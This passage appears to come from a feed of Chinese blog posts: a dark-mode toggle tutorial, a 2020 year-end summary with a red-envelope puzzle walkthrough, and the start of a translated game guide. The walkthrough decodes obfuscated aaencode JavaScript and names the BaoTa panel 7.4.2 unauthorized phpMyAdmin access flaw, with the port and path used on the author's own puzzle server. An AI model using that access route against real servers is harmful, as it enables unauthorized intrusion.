class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 